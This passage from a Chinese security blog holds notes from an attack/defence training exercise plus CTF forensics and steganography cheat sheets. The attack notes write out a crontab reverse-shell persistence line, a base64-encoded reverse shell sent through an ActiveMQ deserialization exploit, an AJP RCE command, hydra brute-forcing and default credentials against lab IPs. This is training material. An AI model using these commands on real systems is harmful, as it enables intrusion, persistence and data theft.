<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>查自身活动端口：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -pantu</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查端口服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -p- -T4 [ip]</span><br></pre></td></tr></table></figure>

<h3 id="vulhub"><a href="#vulhub" class="headerlink" title="vulhub"></a>vulhub</h3><ol>
<li>查看启动docker进程：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 活动容器</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全部容器</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>进入容器修漏洞：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#方法一</span></span><br><span class="line">docker <span class="built_in">exec</span> -it [容器<span class="built_in">id</span>] /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#方法二</span></span><br><span class="line"><span class="built_in">cd</span> [docker目录]</span><br><span class="line">docker-compose <span class="built_in">exec</span> [容器名称] bash</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>修补完漏洞重启容器生效：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker restart [容器<span class="built_in">id</span>]</span><br></pre></td></tr></table></figure>

<p><strong>相关CVE漏洞修复指南：</strong></p>
<ul>
<li><a href="http://got17.cn/1078/">Tomcat7+ Weak Password &amp;&amp; Backend Getshell Vulnerability</a></li>
<li><a href="http://got17.cn/1078/">CNVD-2020-10487(CVE-2020-1938)tomcat ajp 文件读取漏洞</a></li>
<li><a href="http://got17.cn/1079/">Weblogic  10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</a></li>
<li><a href="http://got17.cn/1079/">ActiveMQ反序列化漏洞（CVE-2015-5254）</a></li>
<li><a href="http://got17.cn/1080/">Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</a></li>
<li><a href="http://got17.cn/1080/">Weblogic weak password</a></li>
</ul>
<p><strong>另外可提前把相关漏洞修复文件、脚本、命令准备好，漏洞一确定即可立马修复。</strong></p>
<h2 id="攻"><a href="#攻" class="headerlink" title="攻"></a>攻</h2><h3 id="hydra破解弱口令"><a href="#hydra破解弱口令" class="headerlink" title="hydra破解弱口令"></a>hydra破解弱口令</h3><p>2011-2019年Top100弱口令密码字典 Top1000密码字典 服务器SSH&#x2F;VPS密码字典 后台管理密码字典 数据库密码字典：</p>
<p><a href="https://github.com/k8gege/PasswordDic">https://github.com/k8gege/PasswordDic</a></p>
<p>破解命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、破解ssh： </span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh </span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、破解ftp： </span><br><span class="line">hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV </span><br><span class="line">hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、get方式提交，破解web登录： </span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ </span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4、post方式提交，破解web登录： </span><br><span class="line">hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form <span class="string">&quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot;</span> </span><br><span class="line">hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form <span class="string">&quot;login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;&quot;</span> </span><br><span class="line">（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,&lt;title&gt;中 的内容是表示错误猜解的返回信息提示。） </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4、破解https： </span><br><span class="line">hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5、破解rdp： </span><br><span class="line">hydra ip rdp -l administrator -P pass.txt -V </span><br></pre></td></tr></table></figure>

<p>kali远程连接3389：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rdesktop -f -a 16 [IP]:3389</span><br></pre></td></tr></table></figure>

<h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><p>开局抢速度，在还未来得及更改密码前登上其他队服务器，全局搜flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name flag.txt</span><br></pre></td></tr></table></figure>

<p>为避免被踢下线&#x2F;删用户，暂时想到两个方法，一个是往<code>/etc/crontab</code>加个每分钟反弹shell的定时任务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * root echo &quot;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&quot; | bash -i&#x27;</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure>

<p>另外一个是直接放个脚本，死循环反弹shell。</p>
<p>有待测试。</p>
<h3 id="docker漏洞"><a href="#docker漏洞" class="headerlink" title="docker漏洞"></a>docker漏洞</h3><p>提前按CVE建好文件夹，备好攻击用脚本、命令，一旦确定漏洞还未修复，直接复制粘贴攻击抢手速。</p>
<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>找上传点，burpsuite抓包，改后缀、改文件类型、加图片文件头，一步一步来，传上去的同时还能知道怎么修。</p>
<p>seay审计源码，直接搜相应函数，对判断的函数加条件，或者直接拒绝一切条件（可能违规）。</p>
<h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><p>找带框的一个个试，暂时只能想，而且即使找到了也不太会用。</p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>网站里各种点点点，找到类似<code>[url]/?id=</code>的路径，丢到sqlmap里跑，带cookie的burpsuite抓个包，保存本地再丢给sqlmap。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x0a】安恒厂家网络安全培训 --- day11、day12</title>
    <url>/1082/</url>
    <content><![CDATA[<p>最后两天进行攻防演练实战。</p>
<p>结果还行，搞了个小米音箱，继续努力吧。</p>
<p>记了些脚本，以便快速攻防。</p>
<span id="more"></span>

<h1 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><a href="http://192.168.20.158/robots.txt">http://192.168.20.158/robots.txt</a></p>
<p><a href="http://192.168.40.196/robots.txt">http://192.168.40.196/robots.txt</a></p>
<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh chenyf@192.168.20.253</span><br><span class="line"></span><br><span class="line">ssh chenyf@192.168.40.200</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * root echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.30.123/110 0&gt;&amp;1&quot; | bash -i&#x27;</span> &gt;&gt; /etc/crontab</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*/1 * * * * root echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.30.123/120 0&gt;&amp;1&quot; | bash -i&#x27;</span> &gt;&gt; /etc/crontab</span><br><span class="line"></span><br><span class="line">mysql -h 192.168.20.158 -u root -proot</span><br><span class="line"></span><br><span class="line">mysql -h 192.168.40.196 -u root -proot</span><br><span class="line"></span><br><span class="line">rdesktop -f -a 16 192.168.20.158:3389</span><br><span class="line"></span><br><span class="line">rdesktop -f -a 16 192.168.40.196:3389</span><br><span class="line"></span><br><span class="line">ftp 192.168.20.158</span><br><span class="line">anonymous</span><br><span class="line"></span><br><span class="line">ftp 192.168.40.196</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>

<h2 id="网站后台"><a href="#网站后台" class="headerlink" title="网站后台"></a>网站后台</h2><p><a href="http://192.168.20.158/?/admin/">http://192.168.20.158/?/admin/</a></p>
<p><a href="http://192.168.40.196/?/admin/">http://192.168.40.196/?/admin/</a></p>
<h2 id="扫网站flag"><a href="#扫网站flag" class="headerlink" title="扫网站flag"></a>扫网站flag</h2><p>dirb <a href="http://192.168.20.158/">http://192.168.20.158/</a> dict&#x2F;dirb_zidian.txt</p>
<p>dirb <a href="http://192.168.40.196/">http://192.168.40.196/</a> dict&#x2F;dirb_zidian.txt</p>
<h2 id="爆破弱口令"><a href="#爆破弱口令" class="headerlink" title="爆破弱口令"></a>爆破弱口令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L dict/user.txt -P dict/pass.txt -vV -e ns 192.168.20.158 ssh -f</span><br><span class="line"></span><br><span class="line">hydra -L dict/user.txt -P dict/pass.txt -vV -e ns 192.168.40.196 ssh -f</span><br><span class="line"></span><br><span class="line">hydra 192.168.20.158 rdp -L dict/user.txt -P dict/pass.txt -V -f</span><br><span class="line"></span><br><span class="line">hydra 192.168.40.196 rdp -L dict/user.txt -P dict/pass.txt -V -f</span><br></pre></td></tr></table></figure>

<h2 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><ol>
<li>ActiveMQ</li>
</ol>
<p>抢时间提前访问：<br><a href="http://192.168.20.253:8161/admin/browse.jsp?JMSDestination=event">http://192.168.20.253:8161/admin/browse.jsp?JMSDestination=event</a><br><a href="http://192.168.40.200:8161/admin/browse.jsp?JMSDestination=event">http://192.168.40.200:8161/admin/browse.jsp?JMSDestination=event</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash –i &gt;&amp; /dev/tcp/192.168.30.123/4444 0&gt;&amp;1</span><br><span class="line">YmFzaCATaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMwLjEyMy80NDQ0IDA+JjE=</span><br><span class="line"></span><br><span class="line">java -jar jmet/jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;bash -c &#123;echo,YmFzaCATaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMwLjEyMy80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -Yp ROME 192.168.20.253 61616</span><br><span class="line"></span><br><span class="line">java -jar jmet/jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;bash -c &#123;echo,YmFzaCATaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMwLjEyMy80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -Yp ROME 192.168.40.200 61616</span><br><span class="line"></span><br><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Ajp</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 2020-10487.py -p 8009 -f /WEB-INF/shell.jsp 192.168.20.253 --rce 1</span><br><span class="line"></span><br><span class="line">python3 2020-10487.py -p 8009 -f /WEB-INF/shell.jsp 192.168.40.200 --rce 1</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>Weblogic weak password</li>
</ol>
<p><a href="http://192.168.20.253:7001/console">http://192.168.20.253:7001/console</a><br><a href="http://192.168.40.200:7001/console">http://192.168.40.200:7001/console</a></p>
<p>weblogic<br>Oracle@123</p>
<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>burp抓包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r sql.txt --dbs</span><br><span class="line">sqlmap -r sql.txt -D security --tables</span><br><span class="line">sqlmap -r sql.txt -D security -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>

<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.PHP</span><br><span class="line">.php3 .phtml</span><br><span class="line">.php.</span><br><span class="line">. php</span><br><span class="line">.pphphp</span><br><span class="line"></span><br><span class="line">content/type:image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br></pre></td></tr></table></figure>

<h1 id="defence"><a href="#defence" class="headerlink" title="defence"></a>defence</h1><h2 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd chenyf</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>

<p><a href="http://192.168.30.200/?/admin/">http://192.168.30.200/?/admin/</a></p>
<h2 id="删用户"><a href="#删用户" class="headerlink" title="删用户"></a>删用户</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd 看最后一行</span><br><span class="line">deluser [user]</span><br></pre></td></tr></table></figure>

<p>控制面板 - 用户账户 - 删除用户账户</p>
<h2 id="踢人"><a href="#踢人" class="headerlink" title="踢人"></a>踢人</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">w</span><br><span class="line">ps -ef | grep ssh 找到进程的[pid]</span><br><span class="line"><span class="built_in">kill</span> -9 [pid]</span><br></pre></td></tr></table></figure>

<h2 id="中间件漏洞-1"><a href="#中间件漏洞-1" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h2><p>先 docker ps 记 id</p>
<ol>
<li>ActiveMQ</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /tmp/jetty-realm.properties http://192.168.30.123/jetty-realm.properties</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">cp</span> /tmp/jetty-realm.properties [docker_id]:/opt/apache-activemq-5.11.1/conf/jetty-realm.properties</span><br><span class="line"></span><br><span class="line">docker restart [docker_id]</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Ajp</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /tmp/server.xml http://192.168.30.123/server.xml</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">cp</span> /tmp/server.xml [docker_id]:/usr/local/tomcat/conf/server.xml</span><br><span class="line"></span><br><span class="line">docker restart [docker_id]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>Weblogic weak password</li>
</ol>
<p>改密码，麻溜点</p>
<p><a href="http://192.168.30.100:7001/console">http://192.168.30.100:7001/console</a></p>
<p>weblogic<br>Oracle@123</p>
<h2 id="网页漏洞-改httpd-conf"><a href="#网页漏洞-改httpd-conf" class="headerlink" title="网页漏洞 改httpd.conf"></a>网页漏洞 改httpd.conf</h2><p>加：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Files ~ <span class="string">&quot;flag.txt&quot;</span>&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>

<h2 id="关闭ftp匿名访问"><a href="#关闭ftp匿名访问" class="headerlink" title="关闭ftp匿名访问"></a>关闭ftp匿名访问</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf     //修改配置文件</span><br><span class="line">找到vsftpd.conf中的：</span><br><span class="line"></span><br><span class="line">anonymous_enable=<span class="built_in">yes</span>     //改为no;（<span class="built_in">yes</span>=允许、no=禁止）</span><br><span class="line">保存退出</span><br><span class="line"></span><br><span class="line">service vsftp restart     //重启FTP服务</span><br></pre></td></tr></table></figure>

<h2 id="本地日志查flag"><a href="#本地日志查flag" class="headerlink" title="本地日志查flag"></a>本地日志查flag</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> [<span class="built_in">log</span>] | grep flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>:</span><br><span class="line"></span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/dmesg</span><br><span class="line">/var/log/auth.log</span><br><span class="line">/var/log/boot.log</span><br><span class="line">/var/log/daemon.log</span><br><span class="line">/var/log/dpkg.log</span><br><span class="line">/var/log/kern.log</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/maillog</span><br><span class="line">/var/log/user.log</span><br><span class="line">/var/log/Xorg.x.log</span><br><span class="line">/var/log/alternatives.log</span><br><span class="line">/var/log/btmp  =&gt;  last -f /var/log/btmp | more</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/utmp</span><br><span class="line">/var/log/cups</span><br><span class="line">/var/log/anaconda.log</span><br><span class="line">/var/log/yum.log</span><br><span class="line">/var/log/cron</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/faillog</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br></pre></td></tr></table></figure>

<p>apache下的<code>access.log</code>、<code>error.log</code>。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全3x01】CTF8月竞赛学习----------取证</title>
    <url>/1083/</url>
    <content><![CDATA[<p>在CTF中，取证(Fornesics)赛题包括了文件分析、隐写、内存镜像分析和流量抓包分析。任何要求检查一个静态数据文件（与可执行程序和远程服务器不同）从而获取隐藏信息的都可以被认为是取证题（除非它包含了密码学知识而被认为是密码类赛题）。</p>
<p>本篇为取证类常见做法简单汇总。</p>
<span id="more"></span>

<h1 id="01-GIF文件取证"><a href="#01-GIF文件取证" class="headerlink" title="01 GIF文件取证"></a>01 GIF文件取证</h1><h2 id="gif图片分离"><a href="#gif图片分离" class="headerlink" title="gif图片分离"></a>gif图片分离</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convert test.gif %02d.png</span><br><span class="line">eog *.png</span><br></pre></td></tr></table></figure>

<h2 id="gif图片分离去背景组合"><a href="#gif图片分离去背景组合" class="headerlink" title="gif图片分离去背景组合"></a>gif图片分离去背景组合</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convert test.gif %02d.png</span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> *.png | <span class="keyword">while</span> <span class="built_in">read</span> filename; <span class="keyword">do</span> convert <span class="variable">$filename</span> -transparent white <span class="variable">$filename</span>; <span class="keyword">done</span></span><br><span class="line"><span class="built_in">ls</span> *.png | <span class="keyword">while</span> <span class="built_in">read</span> filename; <span class="keyword">do</span> convert <span class="variable">$filename</span> 00.png -gravity center -composite 00.png; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">eog *.png</span><br></pre></td></tr></table></figure>

<h1 id="02-文件类型取证"><a href="#02-文件类型取证" class="headerlink" title="02 文件类型取证"></a>02 文件类型取证</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file hardshells</span><br><span class="line"><span class="built_in">mv</span> hardshells hardshells.zip</span><br><span class="line">fcrackzip -b -D -v -u -p rockyou.txt hardshells.zip</span><br></pre></td></tr></table></figure>

<h2 id="挂载文件d"><a href="#挂载文件d" class="headerlink" title="挂载文件d"></a>挂载文件d</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> mountpoint</span><br><span class="line">mount d mountpoint/</span><br></pre></td></tr></table></figure>

<h2 id="编辑16进制文件"><a href="#编辑16进制文件" class="headerlink" title="编辑16进制文件"></a>编辑16进制文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexeditor dat</span><br></pre></td></tr></table></figure>

<h2 id="解压缩文件"><a href="#解压缩文件" class="headerlink" title="解压缩文件"></a>解压缩文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip .zip文件</span><br><span class="line">gunzip .gz文件</span><br></pre></td></tr></table></figure>

<h1 id="03-JPG文件取证"><a href="#03-JPG文件取证" class="headerlink" title="03 JPG文件取证"></a>03 JPG文件取证</h1><p>改文件头</p>
<h1 id="04-PCAP文件取证"><a href="#04-PCAP文件取证" class="headerlink" title="04 PCAP文件取证"></a>04 PCAP文件取证</h1><h2 id="查看关联文件"><a href="#查看关联文件" class="headerlink" title="查看关联文件"></a>查看关联文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk PCAP包</span><br></pre></td></tr></table></figure>

<h2 id="分离保存关联文件"><a href="#分离保存关联文件" class="headerlink" title="分离保存关联文件"></a>分离保存关联文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e PCAP包</span><br><span class="line">foremost PCAP包</span><br></pre></td></tr></table></figure>

<h2 id="或者直接搜索"><a href="#或者直接搜索" class="headerlink" title="或者直接搜索"></a>或者直接搜索</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string PCAP包 | grep -i <span class="string">&quot;字符串&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;dEo2NFpxYmRMdw==&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>

<h1 id="05-USB键位信息取证"><a href="#05-USB键位信息取证" class="headerlink" title="05 USB键位信息取证"></a>05 USB键位信息取证</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tshark -r PCAP包 -T fields -e usb.capdata &gt; keyboardData.txt</span><br><span class="line">python keyboardScanCode.py keyboardData.txt</span><br></pre></td></tr></table></figure>


<h1 id="06-内存取证"><a href="#06-内存取证" class="headerlink" title="06 内存取证"></a>06 内存取证</h1><h2 id="Imageinfo"><a href="#Imageinfo" class="headerlink" title="Imageinfo"></a>Imageinfo</h2><p>这个命令可以用来获取内存镜像的摘要信息，比如系统版本，硬件构架等</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data imageinfo</span><br></pre></td></tr></table></figure>

<p>可以使用–info参数来查看Volatility已经添加的profile和插件信息</p>
<h2 id="Kdbgscan"><a href="#Kdbgscan" class="headerlink" title="Kdbgscan"></a>Kdbgscan</h2><p>这个插件可以扫描文件的profile的值，通常扫描结果有多个，只有一个结果是完全正确的，kdbgscan和imageinfo都只适用于windows的镜像</p>
<h2 id="Pslist"><a href="#Pslist" class="headerlink" title="Pslist"></a>Pslist</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data --profile=Win7SPx64 pslist</span><br></pre></td></tr></table></figure>
<p>pslist可以直接列出运行的进程，如果进程已经结束，会在Exit列显示日期和时间，表明进程已经结束</p>
<h2 id="Hivelist"><a href="#Hivelist" class="headerlink" title="Hivelist"></a>Hivelist</h2><p>列举缓存在内存中的注册表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure>

<h2 id="filescan"><a href="#filescan" class="headerlink" title="filescan"></a>filescan</h2><p>扫描内存中的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data --profile=Win7SP1x64 filescan</span><br></pre></td></tr></table></figure>

<p>filescan 也可以结合grep命令来进行筛选，比如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data --profile=Win7SP1x64 filescan |grep <span class="string">&quot;flag&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Dumpfiles"><a href="#Dumpfiles" class="headerlink" title="Dumpfiles"></a>Dumpfiles</h2><p>导出内存中缓存的文件</p>
<p>直接导出上面搜索flag得到的flag.jpeg文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data --profile=Win7SP1x64 dumpfiles -Q 0x000000007f142f20 -D ./ -u</span><br></pre></td></tr></table></figure>

<h2 id="Cmdscan-x2F-cmdline"><a href="#Cmdscan-x2F-cmdline" class="headerlink" title="Cmdscan&#x2F;cmdline"></a>Cmdscan&#x2F;cmdline</h2><p>提取内存中保留的cmd命令使用情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data --profile=Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure>

<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>查看截图</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data --profile=Win7SP1x64 screenshot --dump-dir=./</span><br></pre></td></tr></table></figure>

<ul>
<li>查看系统用户名</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data --profile=Win7SP1x64 printkey -K <span class="string">&quot;SAM\Domains\Account\Users\Names&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看网络连接</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f wuliao.data --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV16J411u7R3">2019 CTF取证实战网络安全课程（入门级）</a></li>
<li><a href="https://blog.csdn.net/XenonL/article/details/104593692/">【笔记】CTF图片、文件的简单取证</a></li>
<li><a href="https://blog.csdn.net/MOLLMY/article/details/100679762">CTF 内存取证 USB流量分析</a></li>
<li><a href="https://www.cnblogs.com/sesefadou/p/11804566.html">Volatility取证使用笔记</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>取证</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全3x02】CTF8月竞赛学习----------隐写</title>
    <url>/1084/</url>
    <content><![CDATA[<p>MISC，中文即杂项，包括隐写，数据还原，脑洞、社会工程、与信息安全相关的大数据等。竞赛过程中解MISC时会涉及到各种脑洞，各种花式技巧，主要考察选手的快速理解、学习能力以及日常知识积累的广度、深度。</p>
<p>本篇为隐写类常见做法简单汇总，以图片为主。</p>
<span id="more"></span>

<h1 id="隐写总结"><a href="#隐写总结" class="headerlink" title="隐写总结"></a>隐写总结</h1><h2 id="png-x2F-bmp"><a href="#png-x2F-bmp" class="headerlink" title="png&#x2F;bmp"></a>png&#x2F;bmp</h2><ol>
<li>看属性</li>
<li>stegsolve过滤通道</li>
<li>binwalk查看文件结构(binwalk -e或foremost分离)</li>
<li>fireworks过滤图层</li>
<li>winhex改文件头(tweakpng查错误部分)</li>
</ol>
<h2 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h2><ol>
<li>看属性</li>
<li>binwalk查看文件结构(binwalk -e或foremost分离)</li>
<li>stegdetect查看隐藏</li>
<li>steghide&#x2F;jphide分离隐藏信息</li>
<li>winhex改文件头</li>
</ol>
<h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><ol>
<li>stegsolve过滤通道</li>
<li>convert分离图片</li>
<li>winhex改文件头</li>
</ol>
<h2 id="mp3-x2F-wav"><a href="#mp3-x2F-wav" class="headerlink" title="mp3&#x2F;wav"></a>mp3&#x2F;wav</h2><ol>
<li>coolpro2分析波形（摩斯电码、曼彻斯特编码）</li>
<li>MP3Stego</li>
<li>winhex查隐写</li>
</ol>
<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="bftools"><a href="#bftools" class="headerlink" title="bftools"></a>bftools</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bftools.exe decode braincopter doge.jpg --output --dogeout.jpg</span><br><span class="line">bftools.exe run --dogeout.jpg</span><br></pre></td></tr></table></figure>

<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk [file]</span><br><span class="line">binwalk -e [file]</span><br></pre></td></tr></table></figure>

<h2 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exiftool [file.jpg] | grep <span class="string">&quot;flag&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="ExtractX"><a href="#ExtractX" class="headerlink" title="ExtractX"></a>ExtractX</h2><p>与文件置于同一目录双击运行</p>
<h2 id="F5-steganography"><a href="#F5-steganography" class="headerlink" title="F5-steganography"></a>F5-steganography</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matthewgao/F5-steganography</span><br><span class="line"><span class="built_in">cd</span> F5-steganography</span><br><span class="line">java Extract [file.jpg] -p [password]</span><br></pre></td></tr></table></figure>

<h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foremost [file]</span><br></pre></td></tr></table></figure>

<h2 id="jphide"><a href="#jphide" class="headerlink" title="jphide"></a>jphide</h2><p>运行jphswin.exe -&gt; jseek -&gt; 输入口令解密</p>
